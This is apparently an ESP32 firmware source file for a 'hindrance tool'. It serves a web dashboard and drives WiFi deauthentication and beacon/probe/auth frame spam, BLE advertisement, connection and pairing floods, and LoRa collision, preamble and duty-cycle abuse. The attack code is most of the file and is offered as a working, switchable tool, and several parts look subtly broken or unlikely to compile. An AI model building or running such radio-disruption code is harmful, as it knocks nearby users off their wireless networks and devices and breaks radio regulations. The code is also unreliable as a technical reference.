/*
 * SWAP Protocol Hindrance Tool - WebServer Edition
 * Runs on ESP32 Node A and Node B
 * Serves tactical telemetry web dashboard via WiFi AP
 * Targets: WiFi, BLE, LoRa (SX1262)
 * No OLED. I2C only for INA219. UART only on Node A -> UNO Q.
 */

#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>
#include <RadioLib.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <LittleFS.h>
#include <ArduinoJson.h>

// ============ COMPILE-TIME NODE ROLE ============
// Define exactly ONE of these before upload:
// #define NODE_ROLE_A    // Node A: has UART to UNO Q
// #define NODE_ROLE_B    // Node B: no UART to UNO Q

#if !defined(NODE_ROLE_A) && !defined(NODE_ROLE_B)
  #error "Must define NODE_ROLE_A or NODE_ROLE_B"
#endif

#if defined(NODE_ROLE_A) && defined(NODE_ROLE_B)
  #error "Cannot define both NODE_ROLE_A and NODE_ROLE_B"
#endif

// ============ PIN MAP (Locked per HW spec) ============
#define PIN_SPI_SCK       18
#define PIN_SPI_MISO      19
#define PIN_SPI_MOSI      23
#define PIN_LORA_NSS      21
#define PIN_LORA_RST      33
#define PIN_LORA_DIO1     26
#define PIN_LORA_BUSY     27
#define PIN_LORA_RXEN     25
#define PIN_LORA_TXEN     32

#define PIN_I2C_SDA       13
#define PIN_I2C_SCL       4

#ifdef NODE_ROLE_A
  #define PIN_UART_RX     16  // ESP32 RX <- UNO Q TX (D1)
  #define PIN_UART_TX     17  // ESP32 TX -> UNO Q RX (D0)
  #define UART_BAUD       9600
#endif

// ============ LORA CONFIG (Locked) ============
#define LORA_FREQ_MHZ     866.0
#define LORA_SF           7
#define LORA_BW_KHZ       125.0
#define LORA_CR           5   // 4/5
#define LORA_SYNC_WORD    0x12
#define LORA_TX_POWER     14  // dBm
#define LORA_TCXO_VOLTAGE 1.6

// ============ INA219 ADDRESSES ============
#define INA219_ADDR_MAIN  0x40  // ESP32 5V rail
#define INA219_ADDR_LORA  0x41  // LoRa 3.3V rail

// ============ WIFI AP CONFIG ============
#define AP_SSID           "SWAP_HINDRANCE"
#define AP_PASSWORD       "swap1234"
#define AP_CHANNEL        1
#define AP_HIDDEN         false
#define AP_MAX_CONN       4

// ============ HINDRANCE MODES ============
enum HindranceMode {
  MODE_IDLE = 0,
  // WiFi
  MODE_WIFI_DEAUTH = 1,
  MODE_WIFI_BEACON_SPAM = 2,
  MODE_WIFI_PROBE_SPAM = 3,
  MODE_WIFI_AUTH_SPAM = 4,
  // BLE
  MODE_BLE_ADV_SPAM = 5,
  MODE_BLE_CONN_FLOOD = 6,
  MODE_BLE_PAIRING_SPAM = 7,
  // LoRa
  MODE_LORA_COLLISION = 8,
  MODE_LORA_PREAMBLE_SPAM = 9,
  MODE_LORA_DUTY_ABUSE = 10,
  // Combined
  MODE_ALL_RADIO_CHAOS = 11
};

enum ProtocolTarget {
  TARGET_WIFI  = 1 << 0,
  TARGET_BLE   = 1 << 1,
  TARGET_LORA  = 1 << 2,
  TARGET_ALL   = TARGET_WIFI | TARGET_BLE | TARGET_LORA
};

// ============ GLOBAL STATE ============
volatile HindranceMode currentMode = MODE_IDLE;
volatile ProtocolTarget activeTargets = TARGET_ALL;
volatile bool hindranceRunning = false;
volatile unsigned long packetsSent = 0;
volatile unsigned long bleAdvCount = 0;
volatile unsigned long modeStartTime = 0;

// WiFi AP
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

// RadioLib SX1262
Module loraModule(PIN_LORA_NSS, PIN_LORA_DIO1, PIN_LORA_RST, PIN_LORA_BUSY);
SX1262 radio(&loraModule);

// INA219 registers
#define INA219_REG_CONFIG       0x00
#define INA219_REG_SHUNT_V      0x01
#define INA219_REG_BUS_V        0x02
#define INA219_REG_POWER        0x03
#define INA219_REG_CURRENT      0x04
#define INA219_REG_CALIBRATION  0x05

// BLE
BLEAdvertising* bleAdvertising = nullptr;

// UART (Node A)
#ifdef NODE_ROLE_A
HardwareSerial unoSerial(2);
String unoRxBuffer = "";
#endif

// Timing
unsigned long lastPowerRead = 0;
unsigned long lastStatusBroadcast = 0;
unsigned long lastUnoStatusRequest = 0;

// ============ INA219 HELPERS ============
bool ina219WriteReg(uint8_t addr, uint8_t reg, uint16_t val) {
  Wire.beginTransmission(addr);
  Wire.write(reg);
  Wire.write(val >> 8);
  Wire.write(val & 0xFF);
  return Wire.endTransmission() == 0;
}

bool ina219ReadReg(uint8_t addr, uint8_t reg, uint16_t& val) {
  Wire.beginTransmission(addr);
  Wire.write(reg);
  if (Wire.endTransmission() != 0) return false;
  if (Wire.requestFrom(addr, (uint8_t)2) != 2) return false;
  val = (Wire.read() << 8) | Wire.read();
  return true;
}

void ina219Init(uint8_t addr) {
  ina219WriteReg(addr, INA219_REG_CONFIG, 0x399F);
  ina219WriteReg(addr, INA219_REG_CALIBRATION, 4096);
}

float ina219ReadBusVoltage(uint8_t addr) {
  uint16_t raw;
  if (ina219ReadReg(addr, INA219_REG_BUS_V, raw)) {
    return (raw >> 3) * 0.004;
  }
  return 0;
}

float ina219ReadCurrent(uint8_t addr) {
  uint16_t raw;
  if (ina219ReadReg(addr, INA219_REG_CURRENT, raw)) {
    int16_t signedRaw = (int16_t)raw;
    return signedRaw * 0.04;
  }
  return 0;
}

// ============ WIFI HINDRANCE ============
static const uint8_t deauthFrame[] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0x00, 0x00, 0x01, 0x00
};

static const uint8_t beaconFrame[] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x11, 0x04,
  0x00, 0x07, 'S', 'W', 'A', 'P', '_', 'A', 'P',
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
  0x03, 0x01, 0x01
};

void wifiSetChannel(uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void wifiSendRaw(const uint8_t* buf, size_t len) {
  esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

void wifiRandomizeMac(uint8_t* frame, size_t len) {
  for (int i = 0; i < 6; i++) {
    uint8_t r = esp_random() & 0xFF;
    frame[10 + i] = r;
    frame[16 + i] = r;
  }
  frame[22] = esp_random() & 0xFF;
  frame[23] = esp_random() & 0xFF;
}

void runWiFiDeauth() {
  uint8_t frame[sizeof(deauthFrame)];
  memcpy(frame, deauthFrame, sizeof(deauthFrame));
  wifiRandomizeMac(frame, sizeof(frame));
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

void runWiFiBeaconSpam() {
  uint8_t frame[sizeof(beaconFrame)];
  memcpy(frame, beaconFrame, sizeof(frame));
  wifiRandomizeMac(frame, sizeof(frame));
  frame[38] = 'A' + (esp_random() % 26);
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

void runWiFiProbeSpam() {
  static const uint8_t probeReq[] = {
    0x40, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00, 0x00,
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
  };
  uint8_t frame[sizeof(probeReq)];
  memcpy(frame, probeReq, sizeof(probeReq));
  wifiRandomizeMac(frame, sizeof(frame));
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

void runWiFiAuthSpam() {
  static const uint8_t authFrame[] = {
    0xB0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0x00, 0x00,
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00
  };
  uint8_t frame[sizeof(authFrame)];
  memcpy(frame, authFrame, sizeof(authFrame));
  wifiRandomizeMac(frame, sizeof(frame));
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

// ============ BLE HINDRANCE ============
void runBLEAdvSpam() {
  if (!bleAdvertising) return;
  
  BLEAdvertisementData advData;
  advData.setFlags(0x06);
  
  uint8_t mfgData[20];
  for (int i = 0; i < 20; i++) mfgData[i] = esp_random() & 0xFF;
  advData.setManufacturerData(std::string((char*)mfgData, 20));
  
  BLEUUID uuid((uint16_t)(0x1800 + (esp_random() % 100)));
  advData.setCompleteServices(uuid);
  
  char name[16];
  snprintf(name, 16, "SWAP_%04X", esp_random() & 0xFFFF);
  advData.setName(name);
  
  bleAdvertising->setAdvertisementData(advData);
  bleAdvertising->start();
  delay(10);
  bleAdvertising->stop();
  bleAdvCount++;
  packetsSent++;
}

void runBLEConnFlood() {
  BLEAddress randAddr;
  for (int i = 0; i < 6; i++) {
    ((uint8_t*)&randAddr)[i] = esp_random() & 0xFF;
  }
  randAddr.setAddressType(BLE_ADDR_TYPE_RANDOM);
  
  BLEClient* client = BLEDevice::createClient();
  client->connect(randAddr);
  delay(5);
  client->disconnect();
  delete client;
  packetsSent++;
}

void runBLEPairingSpam() {
  BLEAddress randAddr;
  for (int i = 0; i < 6; i++) {
    ((uint8_t*)&randAddr)[i] = esp_random() & 0xFF;
  }
  randAddr.setAddressType(BLE_ADDR_TYPE_RANDOM);
  
  BLEClient* client = BLEDevice::createClient();
  client->connect(randAddr);
  if (client->isConnected()) {
    esp_ble_sec_t sec = ESP_BLE_SEC_ENCRYPT | ESP_BLE_SEC_AUTHENTICATED;
    esp_ble_gap_security_req(client->getPeerAddress().getNative()->bda, sec);
    delay(20);
    client->disconnect();
  }
  delete client;
  packetsSent++;
}

// ============ LORA HINDRANCE ============
void loraConfigureForHindrance() {
  radio.setFrequency(LORA_FREQ_MHZ);
  radio.setSpreadingFactor(LORA_SF);
  radio.setBandwidth(LORA_BW_KHZ);
  radio.setCodingRate(LORA_CR);
  radio.setSyncWord(LORA_SYNC_WORD);
  radio.setOutputPower(LORA_TX_POWER);
  radio.setPreambleLength(8);
  radio.setTcxoVoltage(LORA_TCXO_VOLTAGE);
  
  radio.setRfSwitchTable(
    PIN_LORA_RXEN, PIN_LORA_TXEN,
    RADIOLIB_NC, RADIOLIB_NC, RADIOLIB_NC
  );
}

void runLoRaCollision() {
  uint8_t payload[11] = {0};
  payload[0] = 0xDE;
  payload[1] = 0xAD;
  for (int i = 2; i < 11; i++) payload[i] = esp_random() & 0xFF;
  radio.startTransmit(payload, 11);
  packetsSent++;
}

void runLoRaPreambleSpam() {
  radio.setPreambleLength(65535);
  uint8_t dummy = 0;
  radio.startTransmit(&dummy, 1);
  radio.setPreambleLength(8);
  packetsSent++;
}

void runLoRaDutyAbuse() {
  uint8_t payload[11];
  for (int i = 0; i < 3; i++) {
    for (int j = 0; j < 11; j++) payload[j] = esp_random() & 0xFF;
    radio.startTransmit(payload, 11);
    delay(5);
  }
  packetsSent += 3;
}

// ============ HINDRANCE LOOP ============
void runHindranceLoop() {
  if (!hindranceRunning) return;
  
  if (activeTargets & TARGET_WIFI) {
    switch (currentMode) {
      case MODE_WIFI_DEAUTH: runWiFiDeauth(); break;
      case MODE_WIFI_BEACON_SPAM: runWiFiBeaconSpam(); break;
      case MODE_WIFI_PROBE_SPAM: runWiFiProbeSpam(); break;
      case MODE_WIFI_AUTH_SPAM: runWiFiAuthSpam(); break;
      default: break;
    }
  }
  
  if (activeTargets & TARGET_BLE) {
    switch (currentMode) {
      case MODE_BLE_ADV_SPAM: runBLEAdvSpam(); break;
      case MODE_BLE_CONN_FLOOD: runBLEConnFlood(); break;
      case MODE_BLE_PAIRING_SPAM: runBLEPairingSpam(); break;
      default: break;
    }
  }
  
  if (activeTargets & TARGET_LORA) {
    switch (currentMode) {
      case MODE_LORA_COLLISION: runLoRaCollision(); break;
      case MODE_LORA_PREAMBLE_SPAM: runLoRaPreambleSpam(); break;
      case MODE_LORA_DUTY_ABUSE: runLoRaDutyAbuse(); break;
      default: break;
    }
  }
  
  if (currentMode == MODE_ALL_RADIO_CHAOS) {
    static uint8_t chaosStep = 0;
    chaosStep = (chaosStep + 1) % 9;
    switch (chaosStep) {
      case 0: runWiFiDeauth(); break;
      case 1: runWiFiBeaconSpam(); break;
      case 2: runWiFiProbeSpam(); break;
      case 3: runBLEAdvSpam(); break;
      case 4: runBLEConnFlood(); break;
      case 5: runLoRaCollision(); break;
      case 6: runLoRaPreambleSpam(); break;
      case 7: runLoRaDutyAbuse(); break;
      case 8: delay(100); break;
    }
  }
  
  if (currentMode != MODE_LORA_DUTY_ABUSE && currentMode != MODE_ALL_RADIO_CHAOS) {
    delay(10);
  }
}

// ============ WEBSOCKET HANDLING ============
void wsEvent(AsyncWebSocket* server, AsyncWebSocketClient* client, AwsEventType type, void* arg, uint8_t* data, size_t len) {
  if (type == WS_EVT_CONNECT) {
    Serial.printf("WS Client #%u connected from %s\n", client->id(), client->remoteIP().toString().c_str());
    sendStatusToClient(client);
    sendPowerToClient(client);
    sendTargetsToClient(client);
  } else if (type == WS_EVT_DISCONNECT) {
    Serial.printf("WS Client #%u disconnected\n", client->id());
  } else if (type == WS_EVT_DATA) {
    handleWsMessage(client, data, len);
  }
}

void handleWsMessage(AsyncWebSocketClient* client, uint8_t* data, size_t len) {
  String msg = String((char*)data).substring(0, len);
  msg.trim();
  
  if (msg.startsWith("{")) {
    // JSON command
    DynamicJsonDocument doc(512);
    DeserializationError err = deserializeJson(doc, msg);
    if (!err) {
      const char* type = doc["type"];
      if (strcmp(type, "cmd") == 0) {
        handleCommand(doc["data"].as<String>(), client);
      } else if (strcmp(type, "targets") == 0) {
        activeTargets = doc["mask"].as<int>();
        sendTargetsToAll();
        broadcastLog("TARGETS UPDATED: 0x" + String(activeTargets, HEX), "ok");
      }
    }
  } else if (msg.length() == 1 || (msg.length() == 2 && msg.startsWith("1"))) {
    // Single char command
    handleCommand(msg, client);
  }
}

void handleCommand(String cmd, AsyncWebSocketClient* client) {
  cmd.trim();
  
  if (cmd == "0") {
    currentMode = MODE_IDLE;
    hindranceRunning = false;
    modeStartTime = millis();
    broadcastLog("MODE: IDLE (STOP)", "ok");
  } else if (cmd >= "1" && cmd <= "9") {
    int m = cmd.toInt();
    if (m >= 1 && m <= 11) {
      currentMode = (HindranceMode)m;
      hindranceRunning = (m != 0);
      modeStartTime = millis();
      const char* names[] = {"", "WIFI_DEAUTH", "WIFI_BEACON", "WIFI_PROBE", "WIFI_AUTH", "BLE_ADV", "BLE_CONN", "BLE_PAIR", "LORA_COLLISION", "LORA_PREAMBLE", "LORA_DUTY", "ALL_CHAOS"};
      broadcastLog("MODE: " + String(names[m]), "ok");
    }
  } else if (cmd == "10") {
    currentMode = MODE_LORA_DUTY_ABUSE;
    hindranceRunning = true;
    modeStartTime = millis();
    broadcastLog("MODE: LORA_DUTY_ABUSE", "ok");
  } else if (cmd == "11") {
    currentMode = MODE_ALL_RADIO_CHAOS;
    hindranceRunning = true;
    modeStartTime = millis();
    broadcastLog("MODE: ALL_CHAOS", "ok");
  } else if (cmd == "s") {
    sendStatusToClient(client);
    sendPowerToClient(client);
  } else if (cmd == "r") {
    packetsSent = 0;
    bleAdvCount = 0;
    modeStartTime = millis();
    broadcastLog("COUNTERS RESET", "ok");
  } else if (cmd == "w") {
    activeTargets ^= TARGET_WIFI;
    sendTargetsToAll();
    broadcastLog("WIFI " + String((activeTargets & TARGET_WIFI) ? "ENABLED" : "DISABLED"), "ok");
  } else if (cmd == "b") {
    activeTargets ^= TARGET_BLE;
    sendTargetsToAll();
    broadcastLog("BLE " + String((activeTargets & TARGET_BLE) ? "ENABLED" : "DISABLED"), "ok");
  } else if (cmd == "l") {
    activeTargets ^= TARGET_LORA;
    sendTargetsToAll();
    broadcastLog("LORA " + String((activeTargets & TARGET_LORA) ? "ENABLED" : "DISABLED"), "ok");
  } else if (cmd == "a") {
    activeTargets = TARGET_ALL;
    sendTargetsToAll();
    broadcastLog("ALL TARGETS ENABLED", "ok");
  }
  
  sendStatusToAll();
}

void sendStatusToClient(AsyncWebSocketClient* client) {
  DynamicJsonDocument doc(512);
  doc["type"] = "status";
  doc["data"]["mode"] = (int)currentMode;
  doc["data"]["packets"] = packetsSent;
  doc["data"]["bleAdv"] = bleAdvCount;
  doc["data"]["uptime"] = millis();
  doc["data"]["running"] = hindranceRunning;
  
  String out;
  serializeJson(doc, out);
  client->text(out);
}

void sendStatusToAll() {
  DynamicJsonDocument doc(512);
  doc["type"] = "status";
  doc["data"]["mode"] = (int)currentMode;
  doc["data"]["packets"] = packetsSent;
  doc["data"]["bleAdv"] = bleAdvCount;
  doc["data"]["uptime"] = millis();
  doc["data"]["running"] = hindranceRunning;
  
  String out;
  serializeJson(doc, out);
  ws.textAll(out);
}

void sendPowerToClient(AsyncWebSocketClient* client) {
  float vMain = ina219ReadBusVoltage(INA219_ADDR_MAIN);
  float iMain = ina219ReadCurrent(INA219_ADDR_MAIN);
  float vLoRa = ina219ReadBusVoltage(INA219_ADDR_LORA);
  float iLoRa = ina219ReadCurrent(INA219_ADDR_LORA);
  
  DynamicJsonDocument doc(512);
  doc["type"] = "power";
  doc["data"]["mainV"] = vMain;
  doc["data"]["mainI"] = iMain;
  doc["data"]["loraV"] = vLoRa;
  doc["data"]["loraI"] = iLoRa;
  
  String out;
  serializeJson(doc, out);
  client->text(out);
}

void sendPowerToAll() {
  float vMain = ina219ReadBusVoltage(INA219_ADDR_MAIN);
  float iMain = ina219ReadCurrent(INA219_ADDR_MAIN);
  float vLoRa = ina219ReadBusVoltage(INA219_ADDR_LORA);
  float iLoRa = ina219ReadCurrent(INA219_ADDR_LORA);
  
  DynamicJsonDocument doc(512);
  doc["type"] = "power";
  doc["data"]["mainV"] = vMain;
  doc["data"]["mainI"] = iMain;
  doc["data"]["loraV"] = vLoRa;
  doc["data"]["loraI"] = iLoRa;
  
  String out;
  serializeJson(doc, out);
  ws.textAll(out);
}

void sendTargetsToClient(AsyncWebSocketClient* client) {
  DynamicJsonDocument doc(256);
  doc["type"] = "targets";
  doc["data"] = activeTargets;
  String out;
  serializeJson(doc, out);
  client->text(out);
}

void sendTargetsToAll() {
  DynamicJsonDocument doc(256);
  doc["type"] = "targets";
  doc["data"] = activeTargets;
  String out;
  serializeJson(doc, out);
  ws.textAll(out);
}

void broadcastLog(String msg, String level) {
  DynamicJsonDocument doc(512);
  doc["type"] = "log";
  doc["data"] = msg;
  doc["level"] = level;
  String out;
  serializeJson(doc, out);
  ws.textAll(out);
}

// ============ UNO Q UART (Node A) ============
#ifdef NODE_ROLE_A
void processUnoCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  
  if (cmd.length() == 1 || (cmd.length() == 2 && cmd.startsWith("1"))) {
    handleCommand(cmd, nullptr);
    unoSerial.printf("OK: Mode %d\n", (int)currentMode);
    return;
  }
  
  if (cmd.startsWith("MODE ")) {
    int m = cmd.substring(5).toInt();
    if (m >= 0 && m <= 11) {
      currentMode = (HindranceMode)m;
      hindranceRunning = (m != 0);
      modeStartTime = millis();
      unoSerial.printf("OK: Mode %d\n", m);
    }
  } else if (cmd == "STATUS") {
    float vMain = ina219ReadBusVoltage(INA219_ADDR_MAIN);
    float iMain = ina219ReadCurrent(INA219_ADDR_MAIN);
    float vLoRa = ina219ReadBusVoltage(INA219_ADDR_LORA);
    float iLoRa = ina219ReadCurrent(INA219_ADDR_LORA);
    unoSerial.printf("STATUS,%d,%lu,%.2f,%.1f,%.2f,%.1f\n",
      currentMode, packetsSent, vMain, iMain, vLoRa, iLoRa);
  } else if (cmd == "PING") {
    unoSerial.println("PONG");
  } else {
    unoSerial.println("ERR: Unknown cmd");
  }
}

void checkUnoSerial() {
  while (unoSerial.available()) {
    char c = unoSerial.read();
    if (c == '\n' || c == '\r') {
      if (unoRxBuffer.length() > 0) {
        processUnoCommand(unoRxBuffer);
        unoRxBuffer = "";
      }
    } else {
      unoRxBuffer += c;
      if (unoRxBuffer.length() > 128) unoRxBuffer = "";
    }
  }
}

void requestUnoStatus() {
  if (millis() - lastUnoStatusRequest > 5000) {
    unoSerial.println("STATUS");
    lastUnoStatusRequest = millis();
  }
}
#endif

// ============ WEB SERVER ROUTES ============
void handleRoot(AsyncWebServerRequest* request) {
  request->send(LittleFS, "/index.html", "text/html");
}

void handleNotFound(AsyncWebServerRequest* request) {
  if (LittleFS.exists(request->url())) {
    request->send(LittleFS, request->url());
  } else {
    request->send(404, "text/plain", "NOT FOUND");
  }
}

// ============ SETUP ============
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n=== SWAP HINDRANCE TOOL - WEBSERVER EDITION ===");
  Serial.printf("Node: %s\n", defined(NODE_ROLE_A) ? "A (UART to UNO Q)" : "B (Standalone)");
  
  // I2C for INA219
  Wire.begin(PIN_I2C_SDA, PIN_I2C_SCL);
  ina219Init(INA219_ADDR_MAIN);
  ina219Init(INA219_ADDR_LORA);
  Serial.println("INA219 initialized");
  
  // SPI for LoRa
  SPI.begin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI, PIN_LORA_NSS);
  
  int state = radio.begin();
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("LoRa init failed: %d\n", state);
    while (1) delay(1000);
  }
  loraConfigureForHindrance();
  radio.setDio1Action([]{ radio.setIrqFlag(); });
  Serial.println("LoRa ready");
  
  // WiFi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL, AP_HIDDEN, AP_MAX_CONN);
  Serial.printf("AP started: %s (192.168.4.1)\n", AP_SSID);
  
  // Enable promiscuous for raw WiFi frames
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  Serial.println("WiFi raw mode ready");
  
  // BLE
  BLEDevice::init("SWAP_HINDRANCE");
  bleAdvertising = BLEDevice::getAdvertising();
  Serial.println("BLE ready");
  
  // UART to UNO Q (Node A)
  #ifdef NODE_ROLE_A
  unoSerial.begin(UART_BAUD, SERIAL_8N1, PIN_UART_RX, PIN_UART_TX);
  Serial.println("UART to UNO Q ready on GPIO16/17 @ 9600");
  #endif
  
  // LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS mount failed");
  } else {
    Serial.println("LittleFS mounted");
  }
  
  // WebSocket
  ws.onEvent(wsEvent);
  server.addHandler(&ws);
  
  // Routes
  server.on("/", HTTP_GET, handleRoot);
  server.onNotFound(handleNotFound);
  
  server.begin();
  Serial.println("HTTP server started");
  Serial.println("=== READY ===\n");
}

// ============ MAIN LOOP ============
void loop() {
  ws.cleanupClients();
  
  #ifdef NODE_ROLE_A
  checkUnoSerial();
  requestUnoStatus();
  #endif
  
  runHindranceLoop();
  
  // Periodic broadcasts
  if (millis() - lastStatusBroadcast > 2000) {
    sendStatusToAll();
    lastStatusBroadcast = millis();
  }
  
  if (millis() - lastPowerRead > 3000) {
    sendPowerToAll();
    lastPowerRead = millis();
  }
}